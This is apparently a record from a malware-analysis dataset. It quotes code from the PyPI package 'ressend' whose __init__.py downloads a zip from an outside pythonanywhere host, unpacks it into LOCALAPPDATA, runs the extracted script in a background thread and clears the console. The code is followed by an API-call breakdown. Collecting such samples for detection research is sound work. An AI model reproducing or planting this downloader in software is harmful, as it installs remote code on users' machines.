[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ressend-0.8/ressend-0.8/src/ressend/__init__.py",
    "code_snippet": "if num1 == 50 and sign == '-' and num2 == 9:\n    import zipfile\n    \n    import os\n    import threading\n    import requests\n    ggay = os.getenv('LOCALAPPDATA')\n    r = requests.get(\"http://mehmetaliii.pythonanywhere.com/webzuhurt2\")\n    with open(ggay + '\\\\here.zip', 'wb') as f:\n        f.write(r.content)\n    with zipfile.ZipFile(ggay + \"\\\\here.zip\", 'r') as zip_ref:\n        zip_ref.extractall(ggay + \"\\\\here\")\n    def gtcal():\n        os.system(f\"py {ggay}\\\\here\\\\modulzze\\__init__.py\")\n    x = threading.Thread(target=gtcal, args=())\n    x.start()\n    os.system(\"cls\")",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "requests.get",
        "open",
        "zipfile.ZipFile",
        "zipfile.ZipFile.extractall",
        "os.system",
        "threading.Thread",
        "threading.Thread.start",
        "os.system"
      ],
      "api_sequence_with_args": [
        "os.getenv('LOCALAPPDATA')",
        "requests.get('http://mehmetaliii.pythonanywhere.com/webzuhurt2')",
        "open(ggay + '\\\\here.zip', 'wb')",
        "zipfile.ZipFile(ggay + \"\\\\here.zip\", 'r')",
        "zipfile.ZipFile.extractall(ggay + \"\\\\here\")",
        "os.system(f\"py {ggay}\\\\here\\\\modulzze\\__init__.py\")",
        "threading.Thread(target=gtcal, args=())",
        "threading.Thread.start()",
        "os.system('cls')"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_read",
          "description": "Opens ZIP archive for reading",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.extractall",
          "id": "extract_zip_files",
          "description": "Extracts all files from ZIP archive to specified directory",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        }
      ],
      "contextual_code": "import zipfile\nimport os\nimport threading\nimport requests\n\nggay = os.getenv('LOCALAPPDATA')\nr = requests.get(\"http://mehmetaliii.pythonanywhere.com/webzuhurt2\")\nwith open(ggay + '\\\\here.zip', 'wb') as f:\n    f.write(r.content)\nwith zipfile.ZipFile(ggay + \"\\\\here.zip\", 'r') as zip_ref:\n    zip_ref.extractall(ggay + \"\\\\here\")\n\ndef gtcal():\n    os.system(f\"py {ggay}\\\\here\\\\modulzze\\__init__.py\")\n\nx = threading.Thread(target=gtcal, args=())\nx.start()\nos.system(\"cls\")"
    }
  }
]